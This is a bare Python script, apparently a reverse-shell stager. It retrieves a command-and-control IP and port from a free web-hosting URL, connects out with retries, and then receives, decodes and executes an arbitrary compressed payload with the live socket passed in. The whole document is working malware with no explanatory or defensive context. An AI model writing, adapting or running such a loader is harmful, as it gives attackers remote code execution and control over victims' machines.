import socket,zlib,base64,struct,time,sys,requests
for x in range(10):
        try:
                ip = requests.get('https://foofooco.000webhostapp.com/ip')
                port = requests.get('https://foofooco.000webhostapp.com/port')

                s=socket.socket(2,socket.SOCK_STREAM)
                s.connect((ip.text, int(port.text)))
                break
        except:
                time.sleep(5)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
        d+=s.recv(l-len(d))
exec(zlib.decompress(base64.b64decode(d)),{'s':s})
